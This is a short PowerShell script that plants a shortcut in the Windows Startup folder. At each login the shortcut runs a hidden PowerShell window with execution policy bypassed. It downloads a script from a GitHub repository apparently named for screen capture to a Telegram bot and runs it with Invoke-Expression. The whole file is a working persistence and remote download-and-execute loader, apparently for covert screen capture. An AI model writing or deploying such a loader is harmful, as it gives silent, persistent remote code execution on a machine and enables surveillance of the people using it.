# Define the path for the shortcut
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TelegramBotScheduler.lnk"

# Define the PowerShell command to run
$command = 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/Aman-SecurityKnock/ScreenCapture-TelegramBot/refs/heads/main/src/scheduler.ps1'' -UseBasicParsing).Content)"'

# Create the shortcut
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = $command
$shortcut.IconLocation = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$shortcut.Description = "Runs the Telegram Bot Scheduler in the background"
$shortcut.Save()

Write-Host "Shortcut created and added to Startup folder. The script will run automatically on reboot." -ForegroundColor Green
